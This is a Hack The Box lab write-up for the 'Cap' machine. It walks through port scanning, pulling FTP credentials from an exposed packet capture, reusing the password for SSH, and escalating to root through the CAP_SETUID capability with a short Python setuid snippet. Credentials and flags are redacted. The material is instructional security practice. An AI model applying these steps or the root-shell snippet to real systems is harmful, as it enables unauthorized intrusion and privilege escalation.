# Cap
#HTB #adventure-mode #easy #wireshark #ftp #networks-services #privilege-escalation #authentication #Web #remote-access 
## Target: 
*Name:* Cap
*IP:* 10.129.75.26
## Vulnerability:
- Network traffic captures were accessible directly through the web application without authentication.
- Password reuse between FTP and SSH services.
- The `CAP_SETUID` capability was assigned to the Python binary.
## Steps: 
#### 1) Reconnaissance
**Code:**
```
nmap -p- -sV 10.129.75.26
```
**Result:**
```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-12 16:37 -0400
Nmap scan report for 10.129.75.26
Host is up (0.025s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Gunicorn
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.19 seconds
```
#### 2) Connecting to FTP service
**Code:**
```
ftp -a 10.129.75.26
```
**Result:**
```
Connected to 10.129.75.26.
220 (vsFTPd 3.0.3)
331 Please specify the password.
```
The server response indicates that anonymous login is disabled on the FTP service.
#### 3) Investigating the web application
<img width="2559" height="1070" alt="image" src="https://github.com/user-attachments/assets/2af581e4-25d7-4f56-b2c7-fa483d9444e2" />

We can clearly see the username Nathan, which is a good start.
The web application provides a **Security Snapshot** feature that allows us to capture and analyze network traffic. 
While exploring this section, we notice that it uses IDs to identify different packet captures.
We changed the ID to 0 and noticed multiple packets were captured.
<img width="2559" height="777" alt="image" src="https://github.com/user-attachments/assets/99f81fc5-08c6-4d8c-9710-87315034d53a" />

We downloaded the file, then used `Wireshark` to view its content.
#### 3) Analyzing the network traffic
We opened the file using `wireshark`. We found some interesting requests that revealed the username and password of an FTP account on the target machine.
<img width="1188" height="130" alt="image" src="https://github.com/user-attachments/assets/6559d024-6ddc-45b4-8adc-e380ae170338" />

*Username:* nathan
*Password:* `<PASSWORD>`
#### 4) Authenticating to the FTP service 
We used the credentials we found on the network traffic to connect to the FTP service.
**Code:**
```
ftp nathan@10.129.75.26
```
**Result:**
```
Connected to 10.129.75.26.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password:                                             (Typed <PASSWORD>)
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```
Next, we searched for information on the server, which leaded us to the user flag.
**Full process:**
```
ftp> ls
229 Entering Extended Passive Mode (|||49262|)
150 Here comes the directory listing.
-r--------    1 1001     1001           33 Aug 12 20:35 user.txt
226 Directory send OK.

ftp> get user.txt
local: user.txt remote: user.txt
229 Entering Extended Passive Mode (|||13895|)
150 Opening BINARY mode data connection for user.txt (33 bytes).
100% |******************************************************************************************************************************************************|    33      402.83 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (1.97 KiB/s)

ftp> 
zsh: suspended  ftp nathan@10.129.75.26


    
┌──(________)-[~]
└─$ cat user.txt               
<USER_FLAG>
```
#### 5) SSH Login
We tried Nathan's FTP account password for SSH authentication:
**Code:**
```
ssh nathan@10.129.75.26
```
**Result:**
```
The authenticity of host '10.129.75.26 (10.129.75.26)' can't be established.
ED25519 key fingerprint is: SHA256:UDhIJpylePItP3qjtVVU+GnSyAZSr+mZKHzRoKcmLUI
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:8: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.75.26' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
nathan@10.129.75.26's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Aug 14 08:42:07 UTC 2026

  System load:           0.1
  Usage of /:            36.7% of 8.73GB
  Memory usage:          20%
  Swap usage:            0%
  Processes:             255
  Users logged in:       0
  IPv4 address for eth0: 10.129.75.26
  IPv6 address for eth0: dead:beef::a0de:adff:fef4:636f

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

63 updates can be applied immediately.
42 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu May 27 11:21:27 2021 from 10.10.14.7
nathan@cap:~$ 
```
Nathan used the same password for authentication on both FTP and SSH services. 
#### 6) Privilege escalation
Firstly, we checked Nathan's sudo privileges::
**Code:**
```
sudo -l
```
**Result:**
```
Sorry, user nathan may not run sudo on cap.
```
This confirms that Nathan does not have any sudo privileges on the machine.
Then, we checked for binaries with special capabilities using:
```
getcap -r / 2>/dev/null
```
This revealed that `/usr/bin/python3.8` has the `CAP_SETUID` capability, which allows the process to change the User ID.

Next, we used Python's `os` module to execute system commands.
**Script:**
```python
import os

os.setuid(0)
os.system('/bin/bash')
```

> [!NOTE]
> `os.setuid()` changes the UID (User ID) of the current process.
> Setting the UID to `0` makes the process run as `root`.

**Result:**
```
nathan@cap:~$ python3 test.py
root@cap:~#
```
**Retrieving the root flag:**
```
root@cap:~# cat /root/root.txt
<ROOT_FLAG>
```
## Flag: 
[Not disclosed — solve it yourself!]
## Key takeaway:
- Inspect accessible network traffic for sensitive information.
- Test for password reuse across services.
- Always check binaries for special capabilities on Linux. 
- Understand how Linux capabilities such as `CAP_SETUID` can be abused for privilege escalation.
